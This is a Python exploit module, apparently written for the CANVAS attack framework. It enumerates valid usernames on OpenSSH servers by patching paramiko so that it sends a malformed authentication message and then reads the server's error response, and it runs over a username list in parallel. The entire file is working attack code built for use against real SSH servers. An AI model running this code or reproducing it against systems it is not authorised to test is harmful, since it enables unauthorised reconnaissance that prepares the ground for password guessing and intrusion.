#!/usr/bin/env python

import sys
import os
import logging
import socket
import multiprocessing
from functools import partial

if '.' not in sys.path:
    sys.path.append('.')

from libs import paramiko
from libs import yaml
from canvasexploit import canvasexploit
from exploitutils import standard_callback_commandline
from tcpexploit import tcpexploit

module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']


class NonExistentUser(Exception):
    pass

def add_boolean(*args, **kwargs):
    pass

old_service_accept  = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
old_add_boolean     = paramiko.message.Message.add_boolean


def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    ret = old_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return ret

def auth_failure(*args, **kwargs):
    raise NonExistentUser()

def check_user(username, target):
    logging.debug("User: %s" % username)
    with paramiko.SSHClient() as ssh:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target, username=username, password="t", pkey=paramiko.RSAKey.generate(2048))
        except NonExistentUser:
            logging.debug("INVALID")
            return (username, False)
        except paramiko.ssh_exception.SSHException:
            logging.debug("VALID")
            return (username, True)


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = ""
        self.port               = 22
        self.userlist_path      = None
        self.threads            = 5

    def getArgs(self):
        self.host               = self.target.interface
        self.port               = int(self.argsDict.get('port', self.port))
        self.user               = self.argsDict.get('username', self.user)
        self.userlist_path      = self.argsDict.get('username_file', self.userlist_path)

    def setup(self):
        paramiko.auth_handler.AuthHandler._handler_table.update({
            paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
            paramiko.common.MSG_USERAUTH_FAILURE: auth_failure
        })

    def run(self):
        self.setInfo("%s (in progress on %s)" % (self.name, self.target.interface))
        logging.getLogger('paramiko.transport').setLevel(logging.CRITICAL)
        self.getArgs()

        if self.userlist_path:
            with open(self.userlist_path) as f:
                users = f.read().splitlines()
        elif self.user:
            users = [self.user,]
        else:
            logging.critical("Missing necessary arguments (usernames, usernames list file)")
            return False

        self.setProgress(40)
        self.setup()

        pool = multiprocessing.Pool(self.threads)
        results = pool.map(partial(check_user, target=self.target.interface), users)

        for r in results:
            user    = ""
            exist   = False
            l       = logging.warning
            for e in r:
                if isinstance(e, str):
                    user = e
                elif isinstance(e, bool):
                    exist = e
                    if not e:
                        l = logging.error

            l("%s == %s" % (user, exist))

        return True


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)